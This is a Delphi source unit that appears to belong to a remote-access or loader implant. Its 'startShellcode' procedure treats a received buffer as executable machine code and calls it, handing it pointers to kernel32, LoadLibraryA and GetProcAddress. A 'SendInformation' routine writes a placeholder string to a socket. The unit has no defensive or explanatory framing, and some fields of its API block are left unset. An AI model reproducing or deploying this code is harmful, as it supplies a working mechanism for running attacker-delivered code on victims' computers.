unit untUtils;
interface
uses
  Windows;
type
  xGetProcAddress = function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
  xLoadLibrary = function(strLib:PChar): HMODULE; stdcall;
  xGetMemory = function(dwLen:Integer):Pointer;
  xFreeMemory = procedure(ptrMemory:Pointer);
  xCopyMemory = procedure(pDestiny, pSource:Pointer; dwLen:Integer);

type
  TAPIBlock = record
    hKernelHandle:      Cardinal;
    pGetProcAddress:    xGetProcAddress;
    pLoadLibraryA:      xLoadLibrary;
    pGetMemory:         xGetMemory;
    pFreeMemory:        xFreeMemory;
    pCopyMemory:        xCopyMemory;
  end;
  PAPIBlock = ^TAPIBlock;

type
  TShellCodeFunc = procedure (ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
  PShellCodeFunc = ^TShellCodeFunc;
  
procedure Log(strMessage:PChar);
procedure startShellcode(ptrData:Pointer; dwLen:Cardinal);
procedure SendInformation(hSocket:Integer);

implementation

uses
  untConnection;
  
procedure Log(strMessage:PChar);
begin
  {$IFDEF DEBUG}
    OutputDebugString(strMessage);
  {$ENDIF}
end;

procedure SendInformation(hSocket:Integer);
const
  compname = ' TEST NOW';
begin
  SendBuffer(hSocket, 0, @compname[2], Length(compname));
end;

procedure startShellcode(ptrData:Pointer; dwLen:Cardinal);
const
  strMessage = ' HELLO MAN';
var
  tlbAPIBlock:TAPIBlock;
  tlbShellCode:TShellCodeFunc;
  dwParamLen:Cardinal;
  pData:Pointer;
begin
  CopyMemory(@dwParamLen, ptrData, 4);
  pData := nil;
  if dwParamLen > 0 then
  begin
    pData := AllocMem(dwParamLen);
    if pData <> nil then
      CopyMemory(pData, Pointer(Cardinal(ptrData) + 4), dwParamLen);
  end;
  inc(PByte(ptrData), 4);
  inc(PByte(ptrData), dwParamLen);
  tlbShellCode := ptrData;
  with tlbAPIBlock do
  begin
    hKernelHandle := GetModuleHandleA('kernel32.dll');
    pLoadLibraryA := @Windows.LoadLibraryA;
    pGetProcAddress := @Windows.GetProcAddress;
  end;
  tlbShellCode(pData, dwParamLen, @tlbAPIBlock);
end;
end.
